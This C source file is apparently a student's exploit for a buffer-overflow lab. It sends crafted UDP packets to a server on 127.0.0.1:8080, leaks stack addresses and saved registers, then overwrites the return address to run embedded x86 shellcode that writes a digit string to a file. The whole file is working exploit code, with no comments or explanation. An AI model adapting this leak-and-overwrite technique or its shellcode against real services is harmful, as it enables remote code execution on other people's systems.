//
// Created by hs on 2020/5/22.
//

#include<stdio.h>
#include<stdlib.h>
#include <string.h>
#include <unistd.h>
#include<sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define BUF_SIZE 1024

#define IP_ADDR "127.0.0.1"
#define PORT 8080

char *shellcode = "\x31\xd2\x52\x66\x68\x78\x74\x68\x68\x73\x2e\x74\x89\xe3\x31\xc9\x66\xb9\x41\x02\x66\xba\xb6\x01\x31\xc0\xb0\x05\xcd\x80\x31\xd2\x52\x89\xc3\xb0\x39\x66\x50\x68\x30\x30\x30\x31\x68\x33\x30\x31\x35\x68\x32\x30\x31\x37\x89\xe1\xb2\x0d\x31\xc0\xb0\x04\xcd\x80\x31\xc0\xb0\x01\xcd\x80";

struct PAYLOAD{
    unsigned int data_size;
    union {
        struct{
            unsigned int ret_addr;
            unsigned int old_ebp;
            unsigned int ebx;
            unsigned int i;
            unsigned int length;
            char buf[BUF_SIZE - sizeof(unsigned int)];
            char zero[BUF_SIZE - sizeof(unsigned int) * 5];
        } attack1;
        struct{
            unsigned int buf_addr;
            unsigned int fd;
            unsigned int ret_addr;
            unsigned int old_ebp;
            unsigned int ebx;
            unsigned int i;
            unsigned int length;
            char buf[BUF_SIZE - sizeof(unsigned int)];
            char zero[BUF_SIZE - sizeof(unsigned int) * 7];
        } attack2;
        struct{
            char buf[BUF_SIZE - sizeof(unsigned int)];
            unsigned int length;
            unsigned int i;
            unsigned int ebx;
            unsigned int old_ebp;
            unsigned int ret_addr;
            unsigned int fd;
            unsigned int buf_addr;
            char zero[BUF_SIZE - sizeof(unsigned int) * 7];
        } info;
    }un;
};


int main()
{
    int fd = socket(PF_INET, SOCK_DGRAM, 0);
    if(fd < 0)
    {
        perror("create socket error\n");
        exit(-1);
    }

    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = PF_INET;
    inet_aton(IP_ADDR, &serverAddr.sin_addr);
    serverAddr.sin_port = htons(PORT);

    struct PAYLOAD payload;
    payload.data_size = BUF_SIZE + 7 * 4 - 4;
    payload.un.attack2.i = htonl(0xffffffff);
    payload.un.attack2.length = htonl(BUF_SIZE + 7 * 4 - 4);
    sendto(fd, &payload, BUF_SIZE, 0, (struct sockaddr*)&serverAddr, sizeof(serverAddr));

    struct sockaddr_in from;
    socklen_t socklen = sizeof(from);
    recvfrom(fd, &payload, 2 * BUF_SIZE, 0, (struct sockaddr*)&from, &socklen);
    
    unsigned int buf_addr = payload.un.info.buf_addr;
    unsigned int old_ebp = payload.un.info.old_ebp;
    unsigned int ebx = payload.un.info.ebx;
    
    payload.data_size = BUF_SIZE + 5 * 4 - 4;
    payload.un.attack1.ret_addr = htonl(buf_addr + 6 * 4);
    payload.un.attack1.old_ebp = htonl(old_ebp);
    payload.un.attack1.ebx = htonl(ebx);
    payload.un.attack1.i = htonl(BUF_SIZE + 4 - 1);
    payload.un.attack1.length = htonl(BUF_SIZE + 5 * 4 - 4);
    memcpy(payload.un.attack1.buf, shellcode, strlen(shellcode));
    sendto(fd, (void*)&payload, BUF_SIZE, 0, (struct sockaddr*)&serverAddr, sizeof(serverAddr));

    return 0;
}
